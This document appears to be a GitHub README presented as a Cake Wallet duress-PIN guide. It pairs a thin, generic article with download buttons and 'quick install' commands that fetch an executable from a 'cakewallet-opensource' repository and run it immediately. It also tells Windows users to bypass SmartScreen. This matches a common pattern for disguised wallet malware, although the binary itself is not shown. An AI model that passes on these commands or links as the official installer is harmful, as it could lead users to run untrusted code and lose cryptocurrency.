![Cake Wallet duress pin guide](assets/cake-wallet-duress-pin-article-banner.png)

# Set a Duress PIN in Cake Wallet

A second PIN for coercion, and what it can and cannot protect.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

A duress PIN opens a separate, plausible state of the app when you are forced to unlock it, while your real PIN opens the real wallet. Set it in the app's security settings and test it before you rely on it. It addresses physical coercion, not theft or forgetting, and the two are handled by different features.

<!-- ARTICLE-BODY-BEGIN -->

## How it differs from your PIN
Your PIN unlocks the wallet you use. A duress PIN is an alternative credential that opens a different view, so someone watching you unlock the app sees a wallet rather than a refusal. The point is plausibility under pressure, not extra encryption.

Setting one is therefore a decision about a specific threat: someone who can force you to open the app. It does nothing against malware, a stolen backup or a forgotten PIN.

## Setting it up
Open the app's security settings and choose the duress option, then set the second PIN. Test it on a device with no funds first, so you know what it opens before you trust it under pressure.

The exact contents of the duress state are not documented in the material this guide is built from, so nothing is claimed here about what it shows. Test yours and rely only on what you have seen.

## The threat model it addresses
This is a physical-coercion feature. It assumes an attacker with access to you and to the unlocked device, and it tries to make a refusal unnecessary.

It does not protect the wallet from someone who takes the device and has time. For that, the answer is a separate wallet with few funds, or a signing device, not a second PIN.

## What it does not solve
Forgetting the PIN is the opposite problem, and a duress PIN makes it worse if you confuse the two. There is no recovery for a forgotten PIN, only a restore from the phrase.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-forgot-pin.md">Forgot your Cake Wallet PIN</a> covers the lockout countdown and the restore route, which is where most people arrive at this topic.

## Custody context
A duress PIN is one layer of a self-custody setup, and its value depends on the layers around it: where the phrase is, how many wallets exist, and whether one device holds everything.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md">Cake Wallet safety and custody</a> covers the model as a whole, including why the phrase remains the single point of failure whatever the PIN.

## Current release
Security settings differ between builds, and an older app may not offer the option at all. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and look in the app's security section before assuming the feature is missing.

If you are setting up a new wallet, the PIN choice comes first. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md">Set up Cake Wallet</a> covers the first-run options and the PIN lengths available.

## FAQ
### What is a duress PIN in Cake Wallet?
A second PIN that opens a separate state of the app when you are forced to unlock it.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[set up Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) · [Cake Wallet safety and custody](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) · [forgot your Cake Wallet PIN](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-forgot-pin.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
